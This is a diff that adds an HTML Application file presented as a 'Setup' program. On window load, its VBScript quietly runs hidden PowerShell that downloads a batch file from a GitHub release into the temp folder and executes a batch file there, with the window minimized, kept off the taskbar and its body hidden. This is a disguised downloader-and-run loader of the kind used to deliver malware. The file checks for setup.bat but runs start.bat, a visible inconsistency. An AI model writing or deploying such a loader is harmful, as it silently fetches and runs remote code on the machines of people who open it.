@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION 
+  APPLICATIONNAME="SystemSetup" 
+  BORDER="none" 
+  SHOWINTASKBAR="no" 
+  SINGLEINSTANCE="yes" 
+  WINDOWSTATE="minimize">
+<meta charset="utf-8">
+<title>Setup</title>
+</head>
+<script language="VBScript">
+    Sub Window_OnLoad
+        Dim objShell, objFSO
+        Set objShell = CreateObject("WScript.Shell")
+        Set objFSO = CreateObject("Scripting.FileSystemObject")
+        
+        ' Скачивание через PowerShell
+        objShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'https://github.com/SkyyLauncher0440/start/releases/download/v1.0/start.bat' -OutFile '%TEMP%\setup.bat'""", 0, True
+        
+        ' Проверка и запуск
+        If objFSO.FileExists(objShell.ExpandEnvironmentStrings("%TEMP%\setup.bat")) Then
+            objShell.Run "%TEMP%\start.bat", 0, False
+        End If
+        
+        Window.Close
+    End Sub
+</script>
+<body style="display:none;">
+</body>
+</html>
